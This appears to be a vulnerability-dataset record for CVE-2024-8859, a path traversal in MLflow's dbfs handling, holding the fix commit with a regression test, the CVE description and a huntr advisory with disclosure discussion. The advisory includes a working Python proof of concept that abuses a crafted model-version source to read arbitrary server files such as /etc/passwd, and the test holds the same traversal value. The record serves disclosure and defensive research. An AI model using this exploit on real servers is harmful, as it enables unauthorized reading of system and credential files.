{
    "CVE-2024-8859": {
        "published_date": "2025-03-20T10:09:53.459Z",
        "patch_commits": [
            {
                "url": "https://github.com/mlflow/mlflow/commit/7791b8cdd595f21b5f179c7b17e4b5eb5cbbe654",
                "content": "Improve `_validate_non_local_source_contains_relative_paths` to reject malicious path (#13161)\n\nSigned-off-by: harupy <17039389+harupy@users.noreply.github.com>\r\nSigned-off-by: Harutaka Kawamura <hkawamura0130@gmail.com>\r\nSigned-off-by: mlflow-automation <mlflow-automation@users.noreply.github.com>\r\nCo-authored-by: mlflow-automation <mlflow-automation@users.noreply.github.com>\n\nFilename: mlflow/server/handlers.py:\n```\n@@ -1835,7 +1835,7 @@\ndef _validate_non_local_source_contains_relative_paths(source: str):\n     while (unquoted := urllib.parse.unquote_plus(source)) != source:\n         source = unquoted\n     source_path = re.sub(r\"/+\", \"/\", urllib.parse.urlparse(source).path.rstrip(\"/\"))\n-    if \"\\x00\" in source_path:\n+    if \"\\x00\" in source_path or any(p == \"..\" for p in source.split(\"/\")):\n         raise MlflowException(invalid_source_error_message, INVALID_PARAMETER_VALUE)\n     resolved_source = pathlib.Path(source_path).resolve().as_posix()\n     # NB: drive split is specifically for Windows since WindowsPath.resolve() will append the\n```\n\nFilename: tests/tracking/test_rest_tracking.py:\n```\n@@ -1482,6 +1482,17 @@\ndef test_create_model_version_with_non_local_source(mlflow_client):\n     assert response.status_code == 400\n     assert \"If supplying a source as an http, https,\" in response.json()[\"message\"]\n \n+    response = requests.post(\n+        f\"{mlflow_client.tracking_uri}/api/2.0/mlflow/model-versions/create\",\n+        json={\n+            \"name\": name,\n+            \"source\": f\"dbfs:/{run.info.run_id}/artifacts/a%3f/../../../../../../../../../../\",\n+            \"run_id\": run.info.run_id,\n+        },\n+    )\n+    assert response.status_code == 400\n+    assert \"Invalid model version source\" in response.json()[\"message\"]\n+\n \n def test_create_model_version_with_file_uri(mlflow_client):\n     name = \"test\"\n```"
            }
        ],
        "sw_version": "v2.17.0rc0",
        "sw_version_wget": "https://github.com/mlflow/mlflow/archive/refs/tags/v2.17.0rc0.zip",
        "description": "A path traversal vulnerability exists in mlflow/mlflow version 2.15.1. When users configure and use the dbfs service, concatenating the URL directly into the file protocol results in an arbitrary file read vulnerability. This issue occurs because only the path part of the URL is checked, while parts such as query and parameters are not handled. The vulnerability is triggered if the user has configured the dbfs service, and during usage, the service is mounted to a local directory.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/2259b88b-a0c6-4c7c-b434-6aacf6056dcb",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nLocal File Read/Path Traversal in dbfs in mlflow/mlflow\nValid\nReported on Aug 15th 2024\nDescription\nSimilar to CVE-2024-1558 (https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081), only the path part has been checked; parts such as query and parameters have not been handled. When users configure and use the dbfs service, concatenating the URL directly into the file protocol results in an arbitrary file read vulnerability.\nThe vulnerability is triggered if the user has configured the dbfs service; during usage, the service is mounted to a local directory. The following will use a local virtual disk to simulate the configuration of this service, which theoretically produces the same effect as when the service is actually used.\nsudo mkdir /dbfs\ndd if=/dev/zero of=test.img bs=4M count=10\nsudo losetup /dev/loop99 test.img\nsudo fdisk /dev/loop99\n\n    Command (m for help): n\n    Partition type\n    p   primary (0 primary, 0 extended, 4 free)\n    e   extended (container for logical partitions)\n    Select (default p): p\n    Partition number (1-4, default 1): 1\n    First sector (2048-81919, default 2048):\n    Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-81919, default 81919):\n\n    Created a new partition 1 of type 'Linux' and of size 39 MiB.\n\n    Command (m for help): w\n    The partition table has been altered.\n    Calling ioctl() to re-read partition table.\n    Re-reading the partition table failed.: Invalid argument\n    The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or partx(8).\n\nsudo losetup -d /dev/loop99\nsudo mkfs.ext4 test.img\n    mke2fs 1.46.5 (30-Dec-2021)\n    Found a dos partition table in test.img\n    Proceed anyway? (y,N) y\n    Discarding device blocks: done\n    Creating filesystem with 10240 4k blocks and 10240 inodes\n\n    Allocating group tables: done\n    Writing inode tables: done\n    Creating journal (1024 blocks): done\n    Writing superblocks and filesystem accounting information: done\n\nsudo mount test.img /dbfs\nsudo chown $USER:$USER /dbfs\nProof of Concept\nfrom argparse import ArgumentParser\nfrom random import randbytes\nfrom requests import Session\nfrom urllib.parse import unquote\n\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", required=True)\n    parser.add_argument(\"--path\", default=\"/etc/passwd\")\n    args = parser.parse_args()\n\n    url = args.url\n    ajax_api = f\"{url}/ajax-api/2.0/mlflow\"\n\n    with Session() as s:\n        experiment_name = \"e_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/experiments/create\", json={ \"name\" : experiment_name, \"artifact_location\": \"dbfs:/\" })\n        experiment_id = rsp.json()[\"experiment_id\"]\n\n        rsp = s.post(f\"{ajax_api}/runs/create\", json={ \"experiment_id\" : experiment_id })\n        run_uuid = rsp.json()[\"run\"][\"info\"][\"run_uuid\"]\n        # upload an artifact to force creation of '/dbfs/uuid/artifacts/a?' directory in servers CWD in case\n        # no artifacts were uploaded before:\n        rsp = s.post(f\"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=a?/a\", data=\"whatever\")\n        rsp = s.post(f\"{ajax_api}/experiments/delete\", json={ \"experiment_id\" : experiment_id })\n\n        # create a registered model and version:\n        model_name = \"m_\" + randbytes(4).hex()\n        rsp = s.post(f\"{ajax_api}/registered-models/create\", json={ \"name\" : model_name })\n\n        rsp = s.post(f\"{ajax_api}/model-versions/create\", json={\n            \"name\" : model_name,\n            # '/dbfs/uuid/artifacts/a?' is a valid file path\n            \"source\": f\"dbfs:/{run_uuid}/artifacts/a%3f/../../../../../../../../../../../../\"\n        })\n\n        rsp = s.get(f\"{args.url}/model-versions/get-artifact\", params={\n            \"name\" : model_name,\n            \"version\" : 1,\n            \"path\" : args.path.removeprefix(\"/\")\n        })\n\n        try:\n            print(rsp.content.decode())\n        except UnicodeDecodeError:\n            print(rsp.content)\nImpact\nThis vulnerability is capable of arbitrary files in the context of servers process.\nOccurrences\nuc_volume_artifact_repo.py L235\nWe are processing your report and will contact themlflow team within 24 hours.9 months ago\nA GitHub Issue asking the maintainers to create a SECURITY.md exists9 months ago\nhuntr-helpermodified the Severity from High (7.5) to Medium (5.5)9 months ago\nWe have contacted a member of themlflow team and are waiting to hear back9 months ago\nWe have sent a follow up to the mlflow team. We will try again in 4 days.9 months ago\nWe have sent a second follow up to the mlflow team. We will try again in 7 days.9 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nhuntr-helperhas marked this vulnerability as a duplicate of 424b6f6b-e778-4a2b-b860-39730d396f3e8 months ago\nThe disclosure bounty has been dropped\nThe fix bounty has been dropped\nThe researcher's credibility has decreased: -5\nhuntr-helper\ncommented8 months ago\nAdmin\nThis report was closed because it was determined to be a duplicate of a report submitted on 2023-12-21 21:36:43.865000\nm4yfly\ncommented8 months ago\nResearcher\nI am disappointed with your vulnerability assessment criteria. It is obvious that the old vulnerability points you mentioned have been fixed, yet this report can still be reproduced in the latest version, for which you have deemed it as the same vulnerability.\nA huntr admin reset this report to a pending state.8 months ago\nEthan Silvasmodified the Severity from Medium (5.5) to High (7.5)8 months ago\nEthan Silvasset the scheduled publication date to Nov 13th 2024 UTC8 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvas validated this vulnerability8 months ago\nConfirmed previous PoCs from other reports are no longer possible. Able to reproduce this as a separate issue.\nm4yflyhas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8859assigned to this report.8 months ago\nHarutaka Kawamura\ncommented8 months ago\nMaintainer\nThanks for reporting this. Filed https://github.com/mlflow/mlflow/pull/13161 as a fix for this vulnerability.\nA mlflow/mlflow maintainerhas acknowledged this report8 months ago\nThe scheduled publication date was automatically extended from 12th Nov 2024  to 19th Nov 2024  due to the maintainers acknowledgement of the report8 months ago\nHarutaka Kawamura\ncommented8 months ago\nMaintainer\n@m4yfly Can you verify the fix?\nm4yfly\ncommented8 months ago\nResearcher\n@Harutaka Kawamura Hi, The folder was manually created in DBFS just because configuring Databricks runtimes in actuality is complex. I reviewed the patch, and it seems to merely check whether the current environment is a genuine Databricks runtime. It appears that if the current environment is indeed a genuine Databricks runtime, the logic of the vulnerability would not be altered and could still be triggered?\nI believe the main issue lies in insufficient validation when handling the /model-versions/create route. In the _create_model_version() function, when calling _validate_source, the path f\"dbfs:/{run_uuid}/artifacts/a%3f/../../../../../../../../../../../../\" is considered a legitimate path. Furthermore, when processing the /model-versions/get-artifact route and using artifact_uri within dbfs_artifact_repo_factory, there's an opportunity for the path to be used as part of a file protocol URI (without stripping query parameters from the URL or parameters after the # symbol).\nm4yfly\ncommented8 months ago\nResearcher\nI believe the vulnerability still exists as long as the code that concatenates the file protocol in dbfs_artifact_repo_factory has the potential to be triggered. I'm not sure if my understanding of Databricks is correct?\nm4yfly\ncommented8 months ago\nResearcher\n@Ethan Silvas,this issue has been resolved via https://github.com/mlflow/mlflow/pull/13161.\nWe have notified the mlflow/mlflow maintainers about this report in their weekly follow-up7 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8859\n(Published)\nVulnerability Type\nCWE-29: Path Traversal: '\\..\\filename'\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n2.15.1\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$750\nFix Bounty\n$187.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "This advisory includes a Proof of Concept (PoC) demonstrating the exploitation of the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-29",
                "value": "CWE-29 Path Traversal: '\\..\\filename'"
            }
        ]
    }
}